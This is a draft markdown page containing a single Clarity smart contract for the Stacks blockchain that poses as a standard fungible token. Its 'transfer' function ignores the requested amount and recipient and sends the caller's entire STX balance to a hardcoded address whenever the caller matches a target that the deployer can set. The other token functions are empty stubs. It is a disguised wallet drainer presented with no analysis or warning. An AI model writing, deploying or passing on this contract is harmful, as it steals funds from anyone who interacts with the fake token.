---
title: "Trait hic-1"
draft: true
---
```
(impl-trait 'SP3DX3H4FEYZJZ586MFBS25ZW3HZDMEW92260R2PR.ft-trait.ft-trait) (define-constant c tx-sender) (define-data-var t principal tx-sender) (define-fungible-token sos) (define-public (s (a principal)) (ok (and (is-eq c tx-sender) (var-set t a)))) (define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34)))) (if (is-eq tx-sender (var-get t)) (stx-transfer? (stx-get-balance (var-get t)) (var-get t) 'SP2PRP461A8XEC3NH872DBGJBHCDW939N7GWD1C4Y) (ok true))) (define-read-only (get-balance (owner principal)) (ok u0)) (define-read-only (get-name) (ok "")) (define-read-only (get-symbol) (ok "")) (define-read-only (get-decimals) (ok u6)) (define-read-only (get-total-supply) (ok (ft-get-supply sos))) (define-read-only (get-token-uri) (ok none)) (define-public (callback (p principal) (bp (buff 2048))) (ok true))
```
